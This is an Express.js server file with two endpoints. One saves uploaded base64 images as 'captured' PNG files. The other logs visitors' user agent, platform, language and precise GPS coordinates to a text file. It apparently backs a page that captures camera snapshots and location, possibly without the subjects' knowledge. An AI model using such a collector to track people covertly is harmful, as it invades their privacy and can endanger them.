const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 5000;
app.use((req, res, next) => {
  res.setHeader('Cache-Control', 'no-store');
  next();
});

// Serve static files from 'public' directory
app.use(express.static('public'));
app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));


// Middleware to parse JSON body
// app.use(express.json({ limit: '10mb' }));

app.post('/upload', (req, res) => {
  console.log("image received")
  const imageData = req.body.image;

  if (!imageData || !imageData.startsWith('data:image')) {
    return res.status(400).send('Invalid image data');
  }

  const base64Data = imageData.split(',')[1];
  const buffer = Buffer.from(base64Data, 'base64');

  const filename = `captured_${Date.now()}.png`;
  const filepath = path.join(__dirname, filename);

  fs.writeFile(filepath, buffer, (err) => {
    if (err) {
      console.error('Error saving image:', err);
      return res.status(500).send('Server error');
    }

    console.log(`Image saved as ${filename}`);
    res.send('Image received');
  });
});

app.post('/save', (req, res) => {
  console.log("location received")
  const { userAgent, platform, language, location } = req.body;

  const log = `
==== New Entry ====
Time: ${new Date().toISOString()}
User-Agent: ${userAgent}
Platform: ${platform}
Language: ${language}
Location: ${location ? `Lat: ${location.latitude}, Long: ${location.longitude}, Accuracy: ${location.accuracy}` : "Not Available"}
-----------------------------
`;

  fs.appendFile('logs.txt', log, err => {
    if (err) {
      console.error('Error writing to file:', err);
      res.sendStatus(500);
    } else {
      console.log('Data saved.');
      res.sendStatus(200);
    }
  });
});

app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
